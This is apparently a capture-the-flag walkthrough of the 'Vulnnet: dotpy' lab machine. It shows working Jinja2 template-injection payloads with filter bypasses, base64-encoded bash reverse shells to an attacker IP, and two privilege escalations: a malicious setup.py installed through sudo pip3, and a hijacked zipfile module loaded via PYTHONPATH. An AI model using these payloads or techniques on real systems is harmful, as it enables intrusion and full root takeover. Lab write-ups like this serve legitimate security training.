# Vulnnet: dotpy

## Enumeration

cmd: ```sudo nmap -oN nmap/simple 10.10.138.220```

- 8080/tcp open  http-proxy

cmd: ```sudo nmap -sC -sV -p 8080 -oN nmap/open-versions 10.10.138.220```
	
- 8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
	
### Findings
- /login
	- some links, only mailto reveals potential user (hello@vulnnet.com)
	- /register -> allows to create account
- After login
	- Nothing really works on the page
	- Have some user pages
		- Blank page
		- Index
		- 500
- Trying to access /robots.txt

```bash
403			INVALID CHARACTERS DETECTED
Your request has been blocked.
```

- Trying to access /robots

```bash
404			SORRY!
The page you’re looking for was not found.
No results for robots  # <---- hummmm, what is this dude?!
```


## Finding flaws

- Accessing ```/<script>alert(document.location)</script>```
	- Alert pops!! (might need to steal cookies from that address)
- Accessing ```/{{7*'7'}}```
	- No results for 7777777

- **Found:** XSS and STTI

## [Exploring STTI](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f)

- Filters (blocked): , _ []
- Request to leak subclasses
	- Cannot: ```''.__class__.__base__.__subclasses()```
	- Bypass: ```GET /{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()}} HTTP/1.1```
	- Subprocess location in MRO: **401** (using classes_dump.txt and finder.py to obtain it)
	
- Request to RCE: ```GET /{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(401)('ping -c 3 10.9.128.84'),shell=True,stdout=-1)}}```
		
- Request to file read: ```GET /{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(401)('ls%20-la',shell=True,stdout=-1)|attr('communicate')()}}```
		

```bash
	drwxr-xr-x  8 web  web   4096 Aug 27 17:53 .
	drwxr-xr-x 18 web  web   4096 Jan 26  2021 ..
	drwxr-xr-x  5 web  web   4096 Dec 21  2020 app
	-rw-r--r--  1 web  web   1254 Dec 21  2020 config.py
	-rw-r--r--  1 web  web  16384 Aug 27 17:53 db.sqlite3
	-rw-r--r--  1 web  web    450 Dec 21  2020 docker-compose.yml
	-rw-r--r--  1 web  web    224 Dec 21  2020 Dockerfile
	-rw-r--r--  1 web  web     34 Dec 21  2020 .dockerignore
	drwxr-xr-x  6 web  web   4096 Dec 21  2020 env
	-rw-r--r--  1 web  web    142 Dec 21  2020 .env
	drwxr-xr-x  8 web  web   4096 Dec 21  2020 .git
	-rw-r--r--  1 web  web    281 Dec 21  2020 .gitignore
	-rw-r--r--  1 web  web    198 Dec 21  2020 gunicorn-cfg.py
	-rw-r--r--  1 root root   888 Jan 29  2021 LICENSE.md
	drwxr-xr-x  2 web  web   4096 Dec 21  2020 media
	drwxr-xr-x  2 web  web   4096 Dec 21  2020 nginx
	-rw-r--r--  1 web  web    612 Dec 21  2020 package.json
	-rw-r--r--  1 web  web     36 Dec 21  2020 Procfile
	drwxr-xr-x  2 web  web   4096 Dec 21  2020 __pycache__
	-rw-r--r--  1 web  web     34 Dec 21  2020 requirements-mysql.txt
	-rw-r--r--  1 web  web     29 Dec 21  2020 requirements-pgsql.txt
	-rw-r--r--  1 web  web    105 Dec 21  2020 requirements.txt
	-rw-r--r--  1 web  web   3104 Jan 29  2021 run.py
	-rw-r--r--  1 web  web     14 Dec 21  2020 runtime.txt
```

- Request to test for ping
	- Using b64 to avoid the "." blacklisting
	- Request: ```GET /{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(401)('echo%20-n%20%22cGluZyAtYyAzIDEwLjkuMTI4Ljg0Cg==%22|base64%20-d|sh',shell=True,stdout=-1)|attr('communicate')()}}```


- Request to RCE
	- unencoded payload: ```/bin/bash -c "bash -i >& /dev/tcp/10.9.128.84/1414 0>&1"```
	- encoded payload: ```L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjkuMTI4Ljg0LzE0MTQgMD4mMSI=```
	- Request: ```GET/{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(401)('echo%20-n%20%22L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjkuMTI4Ljg0LzE0MTQgMD4mMSI=%22|base64%20-d|sh',shell=True,stdout=-1)|attr('communicate')()}}```


## Got in

cmd: ```whoami && id```

```bash
web
uid=1001(web) gid=1001(web) groups=1001(web)
```

cmd: ```sudo -l```

```bash
User web may run the following commands on vulnnet-dotpy:
    (system-adm) NOPASSWD: /usr/bin/pip3 install *
```

## Privescing

cmd: ```mkdir /tmp/www```
cmd: ```cd /tmp/www```
cmd: ```nano setup.py ```

```python
import os
os.system("/bin/bash -c 'bash -i >& /dev/tcp/10.9.128.84/1415 0>&1'")
```

cmd: ```sudo -u system-adm /usr/bin/pip3 install .```

## Got in

cmd: ```whoami && id```

```bash
system-adm
uid=1000(system-adm) gid=1000(system-adm) groups=1000(system-adm),24(cdrom)
```

cmd: ```sudo -l```
	

```bash
User system-adm may run the following commands on vulnnet-dotpy:
    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
```
	
## Enumeration
- Script seems ok! it backups manage's home folder
- Can read the backup
	cmd: ```sudo /usr/bin/python3 /opt/backup.py```

```bash
- -rw-r--r--  1 root root      2769 Aug 28 17:52 backup-20210828175259-manage.zip
```

- Since we got SETENV available, we can hijack libraries
		

## Exploitation

cmd: ```mkdir /tmp/waza```
cmd: ```cd /tmp/waza```
cmd: ```nano zipfile.py```

```python
import os

def ZipFile(arg, mode):
	os.system("/bin/bash -c 'bash -i >& /dev/tcp/10.9.128.84/1415 0>&1'")
```

cmd: ```sudo PYTHONPATH=/tmp/waza/ /usr/bin/python3 /opt/backup.py```

## Got in

cmd: ```whoami && id```
	
```bash
root
uid=0(root) gid=0(root) groups=0(root)
```


